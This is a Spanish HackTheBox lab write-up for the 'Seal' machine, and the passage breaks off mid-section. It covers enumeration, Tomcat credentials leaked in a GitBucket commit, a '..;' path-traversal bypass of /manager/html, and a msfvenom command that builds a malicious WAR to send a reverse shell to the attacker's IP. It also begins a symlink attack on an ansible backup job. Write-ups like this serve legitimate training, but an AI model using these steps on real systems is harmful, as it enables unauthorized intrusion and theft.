---
layout      : post
title       : "HackTheBox - Seal"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358banner.png
category    : [ htb ]
tags        : [ backup, ansible-playbook, tomcat-manager, .war, .yml, GitBucket ]
---
M√°quina **Linux** nivel medio. Fuzzeo loco, repositorios (**GitBucket**) con commits a√∫n m√°s locos, movimientos sucios con **Tomcat Manager**, **backups** con -links- (?) yyyyy ejecuci√≥n y creaci√≥n de tareas automatizadas mediante **playbooks** de **ansible** ¬øqu√© puede pasar?

![358sealHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358sealHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [MrR3boot](https://www.hackthebox.eu/profile/13531).

Automatas.

Recorreremos con el servicio web del puerto **443** para comprar verduras :P finalmente encontraremos el servicio `Tomcat`, fuzzearemos mucho m√°s para saber que **tomcat** tiene activos tanto `/manager` como `/host-manager`.

Aprovecharemos otro servicio activo (puerto **8080**) y jugaremos con `GitBucket`, tendremos acceso al repositorio del sitio de "comprar verduras" y tooodos sus archivos, adem√°s de la configuraci√≥n de **tomcat**, veremos que se han introducido cambios (viendo los `commits`) y en uno de ellos veremos una contrase√±a en la configuraci√≥n de `tomcat`. Ser√°n funcionales para acceder al apartado `/manager` como el usuario `tomcat`.

Estando dentro tendremos que causar algunos "errores" para bypassear las restricciones que nos pone la config del sitio, algo as√≠ como un **path traversal**. Jugaremos y jugaremos para subir un objeto `.war` malicioso que al ser ejecutado nos env√≠e un **Reverse Shell**, de esta manera lograremos una sesi√≥n como el usuario `tomcat` en el sistema.

Ya dentro inspeccionaremos un archivo llamado `run.yml` que esta realizando unas tareas, entre ellas un **backup**, aprovecharemos que una de las carpetas que esta siendo copiada en el proceso tiene permisos de escritura para crear un archivo que realmente sea un **link simb√≥lico** contra un objeto del sistema, como resultado del backup lograremos acceder al sistema como `luis` robando su llave privada `SSH`.

Tendremos el permiso de ejecutar el binario `/usr/bin/ansible-playbook` como cualquier usuario del sistema, lo usaremos para generar objeto `.yml` con contenido juguet√≥n y obtener **RCE** en la m√°quina como el usuario `root`.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Vulns conocidas (no del todo) y temitas reales.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

"Es cuesti√≥n de escuchar..."

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Vemos el servidor web alojado en el puerto **443**](#puerto-443).
  * [Inspeccionamos el puerto **8080**](#puerto-8080).
3. [Explotaci√≥n](#explotacion).
  * [Jugamos con **Tomcat Manager**](#tomcat-manager-war).
4. [Movimiento lateral - **backups**: **tomcat** -> **luis**](#ansible-backups).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Generamos **playbook** travieso](#malicious-playbook).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Vamos a descubrir que puertos/servicios tiene abiertos externamente la m√°quina, para esto usaremos `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.10.250 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para utilizar una [funci√≥n **extractPorts**](../../../assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Y obtenemos:

```bash
# Nmap 7.80 scan initiated Wed Aug 25 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.250
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.250 () Status: Up
Host: 10.10.10.250 () Ports: 22/open/tcp//ssh///, 443/open/tcp//https///, 8080/open/tcp//http-proxy///
# Nmap done at Wed Aug 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 83.03 seconds
```

Tres puertos:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una terminal de manera segura. |
| 443    | **[HTTPS](https://sectigostore.com/blog/port-443-everything-you-need-to-know-about-https-443/)**: Servidor web con un certificado que "agrega" seguridad. |
| 8080   | **[HTTP-Proxy](https://www.welivesecurity.com/la-es/2020/01/02/que-es-proxy-para-que-sirve/)**: Existe un "tunel web" por el cual pasan las peticiones de X a Y, el **proxy** act√∫a como intermediario. |

Ya conociendo que puertos hay, necesitamos obtener info de ellos, as√≠ que exploremos que versiones tiene cada uno y adem√°s que scripts (de tooooodos los que tiene `nmap`) encuentran algo llamativo:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, de esta manera no tenemos que ir uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.250
    [*] Open ports: 22,443,8080

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,443,8080 -sC -sV 10.10.10.250 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y el escaneo nos devuelve:

```bash
# Nmap 7.80 scan initiated Wed Aug 25 25:25:25 2021 as: nmap -p 22,443,8080 -sC -sV -oN portScan 10.10.10.250
Nmap scan report for 10.10.10.250
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 25 Aug 2021 16:17:17 GMT
|     Set-Cookie: JSESSIONID=node01isb6ojilb3td14a1xa0czkeuh10857.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 25 Aug 2021 16:17:17 GMT
|     Set-Cookie: JSESSIONID=node0jq4x2uya6pii1bfu6tjhu7nbq10855.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 25 Aug 2021 16:17:17 GMT
|     Set-Cookie: JSESSIONID=node07941mzij7xi91hvl9nt4ws6xa10856.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=8/25%Time=61266D0B%P=x86_64-pc-linux-gnu%r(Ge
...
...
...
SF:0</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 33.10 seconds
```

Bien, cositas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 |
| 443    | HTTPS    | nginx 1.18.0 |

* Vemos un dominio: `seal.htb`.

Pero nada m√°s, juguemos con los servicios a ver por donde BOOOOOOOOM! (explotamos e.e)

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Puerto 443 [üìå](#puerto-443) {#puerto-443}

Antes de visitar la web, veamos m√°s info del certificado ([SSL/TLS](https://sectigostore.com/blog/port-443-everything-you-need-to-know-about-https-443/)) que contiene el servidor:

```bash
‚ù± openssl s_client -connect 10.10.10.250:443
```

Entre todo lo que destacamos es el dominio de antes peeero adem√°s:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_openssl_viewCertificate.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una direcci√≥n de correo, de ah√≠ podemos extraer el usuario `admin` y de nuevo el dominio `seal.htb`.

...

Agreguemos el dominio `seal.htb` al archivo [/etc/hosts](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/), para que al intentar visitar el dominio nos resuelva hacia su respectivo contenido hacia la direcci√≥n IP `10.10.10.250`:

```bash
‚ù± cat /etc/hosts
...
10.10.10.250  seal.htb
...
```

Y ahora en la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una web muy linda, pero de la cual no podemos obtener nada que no tengamos ya, as√≠ que profundicemos...

Descubramos que objetos esta sirviendo el servidor web por detr√°s:

```bash
‚ù± dirsearch.py -u https://seal.htb/
...
Target: https://seal.htb/

[25:25:25] Starting:
[25:25:25] 302 -    0B  - /js  ->  http://seal.htb/js/
[25:25:25] 400 -  804B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[25:25:25] 400 -  804B  - /a%5c.aspx
[25:25:25] 302 -    0B  - /admin  ->  http://seal.htb/admin/
[25:25:25] 302 -    0B  - /css  ->  http://seal.htb/css/
[25:25:25] 403 -  564B  - /host-manager/html
[25:25:25] 302 -    0B  - /host-manager/  ->  http://seal.htb/host-manager/html
[25:25:25] 302 -    0B  - /icon  ->  http://seal.htb/icon/
[25:25:25] 302 -    0B  - /images  ->  http://seal.htb/images/
[25:25:25] 200 -   19KB - /index.html
[25:25:25] 302 -    0B  - /manager/  ->  http://seal.htb/manager/html
[25:25:25] 403 -  564B  - /manager/html/
[25:25:25] 401 -    2KB - /manager/status/all
[25:25:25] 302 -    0B  - /manager  ->  http://seal.htb/manager/
[25:25:25] 403 -  564B  - /manager/html
```

Algunos recursos descubiertos con el wordlist por default de `dirsearch`, de todos el √∫nico llamativo (y que nos da una respuesta interesante) es `/manager/status/all`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerSTATUSall_login.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos el login para acceder al manager de `Tomcat`, pero como a√∫n no tenemos credenciales, no logramos pasarlo.

üêà ***`Tomcat-Manager` permite realizar la administraci√≥n de la instancia en ejecuci√≥n: controlar las aplicaciones desplegadas (carga, descarga, despliegue y borrado), ver el estado de la instancia, las peticiones que sirven y con qu√© conector se realizan y el tiempo de procesamiento de cada aplicaci√≥n.*** [espaciocompartir.inap.es - Administraci√≥n Tomcat (PDF)](https://espaciocompartir.inap.es/v3/pluginfile.php/3710/mod_resource/content/20/Administraci%C3%B3n%20de%20Apache%20Tomcat.pdf).

Sabemos que el directorio `/manager` existe y tiene contenido, pues veamos si hay algo m√°s adentro tanto de `manager/` como de `manager/status/`:

```bash
‚ù± dirsearch.py -x 404 -u https://seal.htb/manager
...
[25:25:25] 200 -   19KB - /manager/..;/
...
[25:25:25] 401 -    2KB - /manager/status?full=true
[25:25:25] 401 -    2KB - /manager/status/
[25:25:25] 401 -    2KB - /manager/status
[09:36:19] 401 -    2KB - /manager/text
...
```

Contra `/manager` seguimos obteniendo unos recursos a los que tendr√≠amos acceso solo si tuvi√©ramos credenciales (status code **401**), sin embargo hay uno que nos devuelve un `200 OK` y el recurso tiene un nombre extra√±o, pero al intentarlo en la web nos devuelve al home de la p√°gina...

Enumerando `/manager/status` volvemos a ver el recurso extra√±o solo que ahora existe un redireccionamiento:

```bash
‚ù± dirsearch.py -x 404 -u https://seal.htb/manager/status
...
[09:52:55] Starting: 
[09:52:58] 302 -    0B  - /manager/status/..;/  ->  http://seal.htb/manager/html
...
```

Y si, al intentar conectarnos a `https://seal.htb/manager/status/..;/` nos lleva a `http://seal.htb/manager/html`.

El recurso `/manager/html` es conocido en `Tomcat`, ya que ah√≠ se listan las aplicaciones montadas en el servidor y algunos detalles de ellas... ü§î Eso me dio la idea de buscarlo de todas las maneras posibles, ya que si existe `/manager`, debe existir `/manager/html`.

Finalmente, al probar varias peticiones como:

```html
https://seal.htb/manager/status/html
https://seal.htb/manager/status/..;/html
https://seal.htb/manager/hola/..;/html
```

Nos muestra el **panel login** hacia `tomcat`. La √∫ltima prueba es llamativa, ya que no le importa el directorio `/hola` (que supongo no existe) y aun as√≠ nos pide las credenciales, pooooor lo que podemos intuir que estamos causando alg√∫n tipo de ¬øerror? ¬øbypass quiz√°s? O incluso un ¬øpath traversal? Oooo que simplemente nos pide las creds **porque puede** y dentro no hay nada :P, no lo sabemos, pero sabemos que podemos intuir cositas...

Es como que entra a `/hola`, se sale del directorio al usar `..;` y vuelve a quedar en `/manager` para despu√©s entrar a `/html`, logrando as√≠:

* `https://seal.htb/manager/hola/..;/html` redirect a `https://seal.htb/manager/html`.

Bastante extra√±o... No obstante claro, tamos igual que antes, no tenemos credenciales y no hay m√°s para ver por ac√°, mov√°monos al otro servicio.

---

## Puerto 8080 [üìå](#puerto-8080) {#puerto-8080}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_login.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos un servicio llamado [GitBucket](https://github.com/gitbucket/gitbucket) que seg√∫n su propia descripci√≥n es una plataforma web basada en **Git** bastante intuitiva y sencilla de usar.
Adem√°s nos recibe un nuevo **login panel**, peeero ac√° tenemos la posibilidad de crear una cuenta, hag√°moslo...

Una vez dentro con nuestras credenciales, vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_newsfeed.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos "visi√≥n" de los repos credos por `root` (a la izquierda) y en el centro hay un hist√≥rico de los cambios que se han hecho en cada repo. Si nos fijamos, existe el repositorio del servicio web `Seal Market`, el cual ya recorrimos, pues ech√©mosle un ojo y detallemos con el otro:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_REPO_sealMarket.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay varias cositas interesantes:

* Un usuario llamado `alex`.
* Existe un **issue** en el repo, ya veremos que hay.
* Vemos una lista de **-tareas por hacer-**:
  * Habla sobre algo llamado `autenticacion mutua`.
  * Nos da a entender que hay cambios en los objetos de `tomcat` (por eso se√±ale los ***commits***).
  * Y que hay que deshabilitar tanto `manager` como `host-manager` (que los vimos antes).

Veamos r√°pidamente el **issue**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_REPO_sealMarket_issue.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos la interacci√≥n entre dos usuarios, `alex` que ya lo conoc√≠amos y uno nuevo: `luis`, guard√©moslo tambi√©n por si algo.

Se sigue hablando del la **autenticaci√≥n mutua**, les dejo este excelente post donde explica a detalle como funciona, esta muy bueno:

* [Autenticaci√≥n mutua con TLS](https://medium.com/bancolombia-tech/autenticaci%C3%B3n-mutua-con-tls-del-requisito-a-la-implementaci%C3%B3n-2cd71fea3e90).

Antes de adentrarnos en temas locos, veamos que cambios se le hicieron a `tomcat`, para esto nos podemos apoyar en los commits que se han creado, damos clic en "`13 commits`" y:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_REPO_sealMarket_commitsTomcat.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay dos relacionados con `tomcat`, el inicial donde se agreg√≥ toooda la config y el segundo que ser√≠a una actualizaci√≥n de algo, observemos ese -algo-:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page8080_REPO_sealMarket_commitsTomcat_password.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos que a **luis** se le hab√≠a filtrado la configuraci√≥n del usuario `tomcat`, como la contrase√±a y los roles asignados, pero bueno como la quito ya no debe ser funcional ¬øo si?

Si volvemos a la lista de cosas por hacer recordamos que a√∫n no se ha hecho **push** (actualizado) el repo con las nuevas configuraciones, entoooooooooonces, las credenciales deber√≠an ser v√°lidas, chequera:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_login_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerSTATUSall.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PEEEEEEEEEERFECTOOOOOOOOOO!! Tenemos acceso al `manager` de **tomcat** (:

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

...

## Jugamos con <u>Tomcat Manager</u> [üìå](#tomcat-manager-war) {#tomcat-manager-war}

De nuevo hay varias cositas para detallar:

| Servicio | Versi√≥n |
| ------------- | :---------- |
| Apache Tomcat | 9.0.31 |
| [JVM](https://searchdatacenter.techtarget.com/es/definicion/Maquina-virtual-Java-o-JVM) | 11.0.11 |
| Linux         | 5.4.0-77-generic |

Si exploramos y exploramos no encontramos nada relacionado con esas versiones :(

Ac√° record√© que una vez se tiene acceso al `manager` de **Tomcat**, hay una opci√≥n para subir archivos `.war` **(**

‚òï ***Es un archivo `JAR` (tipo de archivo que contiene una aplicaci√≥n escrita en Java) utilizado para distribuir una colecci√≥n de JavaServer Pages, servlets, clases Java, archivos XML, bibliotecas de tags y p√°ginas web est√°ticas (HTML y archivos relacionados) que juntos constituyen una aplicaci√≥n web.*** [Wikipedia](https://es.wikipedia.org/wiki/WAR_(archivo)). 

> Basicamente es un objeto comprimido que dentro contiene los archivos a ser ejecutados :P

**)**, pero claro, la idea detr√°s de esto es generar ese objeto `war`, pero con contenido malicioso, para que cuando sea desplegado se ejecute ese contenido.

* [Multiple Ways to Exploit Tomcat Manager](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/).

Lo primero ser√° generar el objeto `war` malicioso, usaremos `msfvenom`, pero tomaremos el objeto `.war` resultante y veremos sus archivos, as√≠ explicamos como seria crear el objeto `war` manualmente: (debemos tener en cuenta algunas cositas (por no tenerlas en cuenta casi me desmayo del desespero :P))

* [Ac√° se muestra el proceso manual](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager):

Creamos el archivo con `msfvenom`:

> Le pasamos el payload `jsp_shell_reverse_tcp` (al estar trabajando con **Java**) para que una vez sea ejecutado nos env√≠e una Reverse Shell al puerto `4433` de nuestro sistema.

```bash
‚ù± msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.93 LPORT=4433 -f war > warrafa.war
```

Si vemos que tipo de archivo es el objeto `.war` (y si leemos el post de arriba) sabemos que simplemente es un `.zip` (comprimido) pero con otra extensi√≥n:

```bash
‚ù± file warrafa.war
warrafa.war: Zip archive data, at least v2.0 to extract
```

Lo descomprimimos:

```bash
‚ù± unzip warrafa.war 
Archive:  warrafa.war
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: lcpzixabzti.jsp
```

Bien, si vemos el archivo `lcpzixabzti.jsp`, nos damos cuenta de que contiene lo que ejecutara la web, en este caso una reverse Shell (que fue lo que le indicamos a **msfvenom**):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_reversingWARofMSFVENOM_JSPfile.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Por lo que si quisi√©ramos podr√≠amos cambiar su contenido, su nombre, todo, toooooodo dentro y fuera del objeto `.jsp`, lo que sea que tenga ser√° lo que se ejecutara al desplegar el `.war`.

En su momento jugu√© con estas dos reverse Shell:

* [https://github.com/tennc/webshell/blob/master/jsp/jsp-reverse.jsp](https://github.com/tennc/webshell/blob/master/jsp/jsp-reverse.jsp).
* [https://gist.github.com/maugern/0845b64730a2c606ec726e48902c3308](https://gist.github.com/maugern/0845b64730a2c606ec726e48902c3308).

Listones, sigamos...

Los problemas pueden aparecer si jugamos equ√≠vocamente con el archivo `web.xml` (o a m√≠ me paso y casi muero mentalmente):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_reversingWARofMSFVENOM_WEBXMLfile.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si quieren interactuar con los tags tienen que hacerlo de la manera correcta (y que tengan que ver con implementar un archivo `.jsp`), as√≠ evitan errores, algunos ejemplos:

* [Configura el descriptor de implementaci√≥n de web.xml](https://cloud.google.com/appengine/docs/flexible/java/configuring-the-web-xml-deployment-descriptor).
* [Configuring JSP File](https://www.sitesbay.com/jsp/configuring-jsp-file).
* [Servlet JSP web.xml](https://stackoverflow.com/questions/6401588/servlet-jsp-web-xml).

Entonces, dentro del objeto `.xml` llamamos a nuestro archivo `.jsp`, as√≠ el aplicativo entiende que debe ejecutar.

Ya teniendo los archivos (`WEB-INF/`, `WEB-INF/web.xml` y `<archivo>.jsp`), lo que hace `msfvenom` es comprimirlos, podr√≠a ser as√≠:

```bash
‚ù± zip warrafa.zip -9 -r ./                                                                      
  adding: lcpzixabzti.jsp (deflated 61%)
  adding: WEB-INF/ (stored 0%)
  adding: WEB-INF/web.xml (deflated 29%)
```

Y ahora simplemente le cambia el nombre:

```bash
‚ù± mv warrafa.zip warrafa.war
```

Y ese es el archivo que obtenemos cuando generamos el archivo `.war` con `msfvenom` (:

***Ya conocemos como se hace manualmente el proceso (es muuuuuuuy sencillo), sigamos...***

...

Lo siguiente es posicionarnos en el apartado que nos permite subir archivos `.war`, o sea en `/manager/html`, pero:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML_forbidden.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

F...

Volviendo a nuestra enumeraci√≥n ten√≠amos un recurso extra√±o que causaba cosas locas: `/..;`, antes ya hab√≠amos descubierto algo, prob√©moslo:

```php
https://seal.htb/manager/..;/html //error
https://seal.htb/manager/hola/..;/html
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML-traversal_apps.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos las aplicaciones hosteadas actualmente (: Si bajamos un poquito:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML-traversal_deploy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, encontramos la opci√≥n para subir objetos `.war`, nos enfocaremos en **WAR file to deploy**. Damos clic en `Browse` y buscamos el archivo **war** que creamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML-traversal_deploy_BROWSEwarrafa.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y finalmente damos clic en `Deploy`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML-traversal_deploy_forbidden.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

:O Nos da un error, peeeeeeero si haz estado atento ya viste la raz√≥n :P

Intenta ir a la URL:

```html
https://seal.htb/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<AC√Å_VA_UN_TOKEN_RANDOM_DE_SESI√ìN_ASDF>
```

Pero seg√∫n lo que hemos trabajo, la URL deber√≠a ser:

```html
https://seal.htb/manager/<loquesea>/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=<AC√Å_VA_UN_TOKEN_RANDOM_DE_SESI√ìN_ASDF>
```

Para que encuentre realmente el recurso, as√≠ que podemos apoyarnos de `BurpSuite` para modificar la **URL** antes de enviar la petici√≥n:

(Abrimos Burp, activamos proxy tanto en la web como en Burp y volvemos a subir el archivo `.war)

> **Les recomiendo hacer este paso en una sesion incognita as√≠ no les toma las cookies que tengan del otro sitio, o no se si es que solo a mi me genero bastantes problemas y no veia el archivo subiendose**.

La petici√≥n original ser√≠a esta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358burp_managerHTML-traversal_deploy_original.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358burp_managerHTML-traversal_deploy_originalURL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Debemos modificarla a:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358burp_managerHTML-traversal_deploy_trunkURL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Enviamos la petici√≥n (`forward`) yyyyy en la respuesta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358page443_managerHTML-traversal_apps_warrafa.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hemos subido nuestro archivo correctamenteeeeeeeeeeeeeeeeeeeeeee!! Ahora simplemente quedar√≠a ejecutarlo:

Nos ponemos en escucha por el puerto `4433`: `nc -lvp 4433` y en la web damos clic a `warrafa` o generamos una petici√≥n contra:

```html
https://seal.htb/warrafa/
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_tomcatRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Liiiistos, tenemos nuestra **Reverse Shell** como el usuario `tomcat` (: realicemos tratamiento de la **TTY** para poder ejecutar `CTRL+C`, tener hist√≥rico de comandos y poder movernos entre ellos:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

...

üí• ***He creado un script que casi me deja loco, en √©l automatizamos la creaci√≥n del archivo `.jsp`, `web.xml` y el `.zip`, todo esto para obtener una Reverse Shell desde el propio script sin usar `msfvenom`.***

La verdad me gusto demasiado como quedo, ah√≠ se los dejo :P

> [tomAnageRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/seal/tomAnageRCE.py)

...

# backups : tomcat -> luis [#](#ansible-backups) {#ansible-backups}

Existen 2 usuarios con acceso a una Shell:

```bash
tomcat@seal:/$ cat /etc/passwd | grep -E "sh$"
root:x:0:0:root:/root:/bin/bash
luis:x:1000:1000:,,,:/home/luis:/bin/bash
```

Enumerando las carpetas del sistema, caemos en `/opt/backups`:

```bash
tomcat@seal:/opt/backups$ ls -la
total 16
drwxr-xr-x 4 luis luis 4096 Aug 26 21:08 .
drwxr-xr-x 3 root root 4096 May  7 09:26 ..
drwxrwxr-x 2 luis luis 4096 Aug 26 21:08 archives
drwxrwxr-x 2 luis luis 4096 May  7 09:26 playbook
```

Dentro de `playbook` hay un objeto llamado `run.yml`:

```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Es un objeto sencillo de leer, hay 3 tareas:

* 1 - Copia archivos.
  
  Lo que hace es una sincronizaci√≥n del directorio `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` con el directorio `/opt/backups/files`.

  (**Algo importante es que copia los -links-, que serian los **links simb√≥licos** que existan en cada objeto.**)

* 2 - Genera un backup.

